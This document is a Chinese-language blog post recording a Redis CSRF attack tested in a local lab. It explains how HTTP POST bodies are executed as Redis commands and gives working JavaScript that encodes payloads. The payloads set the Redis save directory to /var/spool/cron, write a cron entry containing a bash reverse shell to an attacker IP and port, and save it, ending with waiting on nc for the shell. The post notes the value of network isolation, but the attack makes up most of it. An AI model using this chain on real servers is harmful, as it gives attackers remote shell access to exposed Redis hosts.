---
layout: post
title: Redis CSRF漏洞调试记录
description: "redis csrf"
category: scanner
tags: [scanner]
imagefeature: http://7xwdx7.com1.z0.glb.clouddn.com/5551e1cabd3bb.jpg
comments: true
share: true
---

# Redis CSRF漏洞调试记录

### 背景
过完年开工，就爆出了redis的CSRF漏洞。前有通过SSRF构造攻击报文执行redis命令，现在又出客户端请求伪造，redis未授权访问真是后患无穷。作为拥有大内网的“有钱人”们，还是做好网段隔离和访问控制，彻底消除隐患吧。

### 攻击原理
通过阅读
[ Whatsinmyredis作者的github项目](https://github.com/dxa4481/whatsinmyredis)
发现攻击方式为构造POST请求提交至Redis监听端口6379。在Redis对HTTP报文的处理过程中，每次出现%0d%0a换行，就认为是一条命令进行解析，同时在执行无意义的错误命令后，不会主动关闭tcp连接，而是继续执行下一条命令。因此HTTP报文的Header不会影响到POST正文的解析执行，从而形成了CSRF利用。

但是根据作者项目中js脚本的payload，发现无法在实际环境中执行，究其根本原因，还在于空格字符的干扰。虽然作者提供的示例无法直接拿来使用，不过还是暗中给出了解决该问题的链接地址：
`http://www.agarri.fr/kom/archives/2014/09/11/trying_to_hack_redis_via_http_requests/index.html`

这里不得不膜拜一下，人家早在2014年就开始玩HTTP报文攻击redis服务了。文章里提到了构造满足Redis Protocol格式的命令来避免空格的干扰，还提到了读取系统文件内容等利用方式。

通过将原始payload进行编码构造，终于实现了CSRF的任意redis命令执行。

### 攻击利用

在本地搭建的测试环境中，我们尝试利用Redis CSRF写入cron配置脚本，从而获取目标主机的反弹shell。从redis原始操作命令来看，需要4步程序：
* 设置路径:
`config set dir /var/spool/cron/`
* 设置文件名：
 `config set dbfilename root`
* 将cron脚本写入key:
`set wow "\n\n\n* * * * * bash -i >& /dev/tcp/YOUR_IP/YOUR_PORT 0>&1\n\n\n"`
* 利用save命令写入系统目录:
`SAVE`

将这些命令编码，并构造成CSRF攻击页面，具体代码如下：

{% highlight javascript %}

      alert("向redis发送第一次请求");
	  var payload = "CONFIG SET dir /var/spool/cron/ \r\n\r\n";
      $.post("http://192.168.33.130:6379", payload, function(data){alert(data);});

	  alert("向redis发送第二次请求");
	  var payload = "CONFIG SET dbfilename root \r\n\r\n";
      $.post("http://192.168.33.130:6379", payload, function(data){alert(data);});

      alert("向redis发送第三次请求");
	  payload = "*3\r\n$3\r\nSET\r\n$4\r\ntest\r\n$62\r\n\n\n\n*/1 * * * * bash -i >& /dev/tcp/192.168.33.129/9999 0>&1\n\n\n\r\n\r\n";
      $.post("http://192.168.33.130:6379", payload, function(data){alert(data);});


	  alert("向redis发送第四次请求");
	  payload = "SAVE\r\n\r\n";
      $.post("http://192.168.33.130:6379", payload, function(data){alert(data);});

{% endhighlight %}

### 攻击效果

我们可以开启redis的monitor模式来查看攻击效果，
当我们访问CSRF页面时，可以看到这些命令在redis中被顺利执行了。
![redis执行记录](http://7xwdx7.com1.z0.glb.clouddn.com/redis-monitor.png)

同时，我们可以通过crontab -l查看目标主机，确认cron脚本已经被顺利写入文件系统。
![crontab状态](http://7xwdx7.com1.z0.glb.clouddn.com/crontab-list.png)

最后，就安安静静的开着nc等主机上线吧。
